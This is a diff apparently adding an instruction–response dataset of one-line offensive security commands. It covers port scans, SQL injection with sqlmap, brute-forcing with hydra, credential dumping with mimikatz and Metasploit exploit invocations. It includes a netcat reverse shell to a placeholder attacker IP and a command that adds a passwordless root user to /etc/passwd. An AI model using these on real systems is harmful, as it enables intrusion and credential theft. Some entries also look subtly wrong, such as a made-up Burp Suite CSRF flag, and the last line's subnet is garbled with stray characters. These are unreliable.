@@ -1,5 +1,103 @@
 {"INSTRUCTION": "Provide a command to scan a network for open ports using nmap.", "RESPONSE": "nmap -sS -p- <target>"}
 {"INSTRUCTION": "How would you enumerate users on a Linux system?", "RESPONSE": "getent passwd"}
+{"INSTRUCTION": "Provide a command to check for open SSH ports on a subnet.", "RESPONSE": "nmap -p22 192.168.1.0/24"}
+{"INSTRUCTION": "How can I perform a stealth SYN scan on a target?", "RESPONSE": "nmap -sS <target>"}
+{"INSTRUCTION": "Provide a command to scan for vulnerabilities using nmap scripts.", "RESPONSE": "nmap --script vuln <target>"}
+{"INSTRUCTION": "How would you list all running processes on a Linux system?", "RESPONSE": "ps aux"}
+{"INSTRUCTION": "Provide a command to brute-force directories on a web server.", "RESPONSE": "dirb http://<target>"}
+{"INSTRUCTION": "How can I check the version of services running on a target?", "RESPONSE": "nmap -sV <target>"}
+{"INSTRUCTION": "Provide a command to capture network traffic with Wireshark.", "RESPONSE": "wireshark -i eth0"}
+{"INSTRUCTION": "How would you enumerate SMB shares on a target?", "RESPONSE": "smbclient -L //<target>"}
+{"INSTRUCTION": "Provide a command to scan for SQL injection vulnerabilities.", "RESPONSE": "sqlmap -u <url> --dbs"}
+{"INSTRUCTION": "How can I crack a password hash using John the Ripper?", "RESPONSE": "john --format=raw-sha256 <hashfile>"}
+{"INSTRUCTION": "Provide a command to perform a TCP connect scan with nmap.", "RESPONSE": "nmap -sT <target>"}
+{"INSTRUCTION": "How would you check for open ports 80 and 443 on a target?", "RESPONSE": "nmap -p80,443 <target>"}
+{"INSTRUCTION": "Provide a command to enumerate DNS records for a domain.", "RESPONSE": "dnsenum <domain>"}
+{"INSTRUCTION": "How can I exploit a Metasploit module for SMB vulnerabilities?", "RESPONSE": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; run'"}
+{"INSTRUCTION": "Provide a command to scan a website for XSS vulnerabilities.", "RESPONSE": "nikto -h <url> -Plugins xss"}
+{"INSTRUCTION": "How would you find world-readable files on a Linux system?", "RESPONSE": "find / -type f -perm -o+r"}
+{"INSTRUCTION": "Provide a command to generate a wordlist with Crunch.", "RESPONSE": "crunch 6 8 -t @@@@@@@@ -o wordlist.txt"}
+{"INSTRUCTION": "How can I monitor network traffic with tcpdump?", "RESPONSE": "tcpdump -i eth0 -w capture.pcap"}
+{"INSTRUCTION": "Provide a command to check for weak SSH keys.", "RESPONSE": "ssh-audit <target>"}
+{"INSTRUCTION": "How would you escalate privileges using a writable /etc/passwd?", "RESPONSE": "echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd"}
+{"INSTRUCTION": "Provide a command to scan for open UDP ports with nmap.", "RESPONSE": "nmap -sU <target>"}
+{"INSTRUCTION": "How can I enumerate SNMP services on a target?", "RESPONSE": "snmpwalk -v2c -c public <target>"}
+{"INSTRUCTION": "Provide a command to test for directory traversal vulnerabilities.", "RESPONSE": "curl http://<target>/../../etc/passwd"}
+{"INSTRUCTION": "How would you check for running services on a Linux system?", "RESPONSE": "systemctl list-units --type=service"}
+{"INSTRUCTION": "Provide a command to perform a full port scan with masscan.", "RESPONSE": "masscan -p0-65535 <target>"}
+{"INSTRUCTION": "How can I use Hydra to brute-force an FTP login?", "RESPONSE": "hydra -l <username> -P <wordlist> ftp://<target>"}
+{"INSTRUCTION": "Provide a command to scan for outdated software with nmap.", "RESPONSE": "nmap --script banner <target>"}
+{"INSTRUCTION": "How would you find SUID binaries on a Linux system?", "RESPONSE": "find / -perm -u=s -type f"}
+{"INSTRUCTION": "Provide a command to enumerate NFS shares.", "RESPONSE": "showmount -e <target>"}
+{"INSTRUCTION": "How can I test for CSRF vulnerabilities on a website?", "RESPONSE": "burpsuite -u <url> --csrf"}
+{"INSTRUCTION": "Provide a command to check for open VNC ports.", "RESPONSE": "nmap -p5900 <target>"}
+{"INSTRUCTION": "How would you dump password hashes from a Windows system?", "RESPONSE": "mimikatz 'sekurlsa::logonpasswords'"}
+{"INSTRUCTION": "Provide a command to scan a subnet for live hosts.", "RESPONSE": "nmap -sn 192.168.1.0/24"}
+{"INSTRUCTION": "How can I use Aircrack-ng to crack a Wi-Fi password?", "RESPONSE": "aircrack-ng -w <wordlist> -b <bssid> capture.cap"}
+{"INSTRUCTION": "Provide a command to check for misconfigured S3 buckets.", "RESPONSE": "aws s3 ls s3://<bucket-name> --no-sign-request"}
+{"INSTRUCTION": "How would you enumerate subdomains for a website?", "RESPONSE": "gobuster dns -d <domain> -w <wordlist>"}
+{"INSTRUCTION": "Provide a command to scan for HTTP methods on a web server.", "RESPONSE": "nmap --script http-methods <target>"}
+{"INSTRUCTION": "How can I check for weak passwords with CrackMapExec?", "RESPONSE": "crackmapexec smb <target> -u <username> -p <wordlist>"}
+{"INSTRUCTION": "Provide a command to perform a ping sweep with nmap.", "RESPONSE": "nmap -sP <target>"}
+{"INSTRUCTION": "How would you check for open RDP ports?", "RESPONSE": "nmap -p3389 <target>"}
+{"INSTRUCTION": "Provide a command to exploit a SQL injection vulnerability.", "RESPONSE": "sqlmap -u <url> --data='<post-data>' --dbs"}
+{"INSTRUCTION": "How can I enumerate users via SMTP?", "RESPONSE": "smtp-user-enum -M VRFY -U <wordlist> -t <target>"}
+{"INSTRUCTION": "Provide a command to scan for SSL/TLS vulnerabilities.", "RESPONSE": "testssl.sh <target>"}
+{"INSTRUCTION": "How would you check for writable directories on a Linux system?", "RESPONSE": "find / -type d -perm -o+w"}
+{"INSTRUCTION": "Provide a command to perform a DNS zone transfer.", "RESPONSE": "dig axfr <domain> @<nameserver>"}
+{"INSTRUCTION": "How can I use Responder to capture NTLM hashes?", "RESPONSE": "responder -I eth0"}
+{"INSTRUCTION": "Provide a command to scan for open Telnet ports.", "RESPONSE": "nmap -p23 <target>"}
+{"INSTRUCTION": "How would you check for kernel exploits on a Linux system?", "RESPONSE": "linux-exploit-suggester.sh"}
+{"INSTRUCTION": "Provide a command to enumerate MySQL databases.", "RESPONSE": "nmap --script mysql-enum <target>"}
+{"INSTRUCTION": "How can I perform a reverse shell with Netcat?", "RESPONSE": "nc -e /bin/bash <attacker-ip> <port>"}
+{"INSTRUCTION": "Provide a command to scan for weak FTP credentials.", "RESPONSE": "nmap --script ftp-anon <target>"}
+{"INSTRUCTION": "How would you enumerate groups on a Linux system?", "RESPONSE": "getent group"}
+{"INSTRUCTION": "Provide a command to check for open DNS resolvers.", "RESPONSE": "nmap --script dns-recursion <target>"}
+{"INSTRUCTION": "How can I use sqlmap to dump a database?", "RESPONSE": "sqlmap -u <url> --dump"}
+{"INSTRUCTION": "Provide a command to perform a TCP FIN scan.", "RESPONSE": "nmap -sF <target>"}
+{"INSTRUCTION": "How would you check for cron jobs on a Linux system?", "RESPONSE": "ls -la /etc/cron*"}
+{"INSTRUCTION": "How can I scan for open MongoDB ports?", "RESPONSE": "nmap -p27017 <target>"}
+{"INSTRUCTION": "Provide a command to check for HTTP directory listing.", "RESPONSE": "curl -I http://<target>"}
+{"INSTRUCTION": "How would you enumerate environment variables on a Linux system?", "RESPONSE": "env"}
+{"INSTRUCTION": "Provide a command to perform a TCP ACK scan.", "RESPONSE": "nmap -sA <target>"}
+{"INSTRUCTION": "How can I use Nikto to scan a web server?", "RESPONSE": "nikto -h <target>"}
+{"INSTRUCTION": "Provide a command to check for open SMTP ports.", "RESPONSE": "nmap -p25 <target>"}
+{"INSTRUCTION": "How would you find world-writable files on a Linux system?", "RESPONSE": "find / -type f -perm -o+w"}
+{"INSTRUCTION": "Provide a command to enumerate Oracle databases.", "RESPONSE": "nmap --script oracle-enum-users <target>"}
+{"INSTRUCTION": "How can I perform a man-in-the-middle attack with BetterCAP?", "RESPONSE": "bettercap -iface eth0 -caplet http-ui"}
+{"INSTRUCTION": "Provide a command to scan for open Redis ports.", "RESPONSE": "nmap -p6379 <target>"}
+{"INSTRUCTION": "How would you check for weak SSL ciphers?", "RESPONSE": "nmap --script ssl-enum-ciphers <target>"}
+{"INSTRUCTION": "Provide a command to enumerate POP3 services.", "RESPONSE": "nmap --script pop3-capabilities <target>"}
+{"INSTRUCTION": "How can I use Metasploit to scan for vulnerabilities?", "RESPONSE": "msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS <target>; run'"}
+{"INSTRUCTION": "Provide a command to check for open IMAP ports.", "RESPONSE": "nmap -p143 <target>"}
+{"INSTRUCTION": "How would you enumerate network interfaces on a Linux system?", "RESPONSE": "ip addr show"}
+{"INSTRUCTION": "Provide a command to perform a TCP null scan.", "RESPONSE": "nmap -sN <target>"}
+{"INSTRUCTION": "How can I check for weak SNMP community strings?", "RESPONSE": "onesixtyone -c <wordlist> <target>"}
+{"INSTRUCTION": "Provide a command to scan for open PostgreSQL ports.", "RESPONSE": "nmap -p5432 <target>"}
+{"INSTRUCTION": "How would you check for installed packages on a Linux system?", "RESPONSE": "dpkg -l"}
+{"INSTRUCTION": "Provide a command to enumerate MSSQL databases.", "RESPONSE": "nmap --script ms-sql-info <target>"}
+{"INSTRUCTION": "How can I perform a DNS brute-force with dnsmap?", "RESPONSE": "dnsmap <domain>"}
+{"INSTRUCTION": "Provide a command to check for open NFS ports.", "RESPONSE": "nmap -p2049 <target>"}
+{"INSTRUCTION": "How would you check for open files on a Linux system?", "RESPONSE": "lsof"}
+{"INSTRUCTION": "Provide a command to scan for HTTP headers.", "RESPONSE": "curl -I http://<target>"}
+{"INSTRUCTION": "How can I use sqlmap to test for blind SQL injection?", "RESPONSE": "sqlmap -u <url> --technique=B"}
+{"INSTRUCTION": "Provide a command to enumerate FTP users.", "RESPONSE": "nmap --script ftp-enum <target>"}
+{"INSTRUCTION": "How would you check for system logs on a Linux system?", "RESPONSE": "cat /var/log/syslog"}
+{"INSTRUCTION": "Provide a command to perform a TCP Xmas scan.", "RESPONSE": "nmap -sX <target>"}
+{"INSTRUCTION": "How can I scan for open Elasticsearch ports?", "RESPONSE": "nmap -p9200 <target>"}
+{"INSTRUCTION": "Provide a command to check for weak HTTP authentication.", "RESPONSE": "nmap --script http-auth-finder <target>"}
+{"INSTRUCTION": "How would you enumerate kernel modules on a Linux system?", "RESPONSE": "lsmod"}
+{"INSTRUCTION": "Provide a command to scan for open Memcached ports.", "RESPONSE": "nmap -p11211 <target>"}
+{"INSTRUCTION": "How can I use Metasploit to exploit a web vulnerability?", "RESPONSE": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS <target>; run'"}
+{"INSTRUCTION": "Provide a command to enumerate SSH users.", "RESPONSE": "nmap --script ssh-enum-users <target>"}
+{"INSTRUCTION": "How would you check for mounted filesystems on a Linux system?", "RESPONSE": "df -h"}
+{"INSTRUCTION": "Provide a command to scan for open Cassandra ports.", "RESPONSE": "nmap -p9042 <target>"}
+{"INSTRUCTION": "How can I perform a packet capture with tshark?", "RESPONSE": "tshark -i eth0 -w capture.pcap"}
+{"INSTRUCTION": "Provide a command to check for weak VNC passwords.", "RESPONSE": "nmap --script vnc-brute <target>"}
+{"INSTRUCTION": "How would you enumerate user home directories on a Linux system?", "RESPONSE": "ls -la /home"}
+{"INSTRUCTION": "Provide a command to scan for open RabbitMQ ports.", "RESPONSE": "nmap -p5672 <target>"}
+{"INSTRUCTION": "Provide a command to scan a network for open ports using nmap.", "RESPONSE": "nmap -sS -p- <target>"}
+{"INSTRUCTION": "How would you enumerate users on a Linux system?", "RESPONSE": "getent passwd"}
 {"INSTRUCTION": "Provide a command to check for open SSH ports on a subnet.", "RESPONSE": "nmap -p22 192.168.1. керning24"}
 {"INSTRUCTION": "How can I perform a stealth SYN scan on a target?", "RESPONSE": "nmap -sS <target>"}
 {"INSTRUCTION": "Provide a command to scan for vulnerabilities using nmap scripts.", "RESPONSE": "nmap --script vuln <target>"}
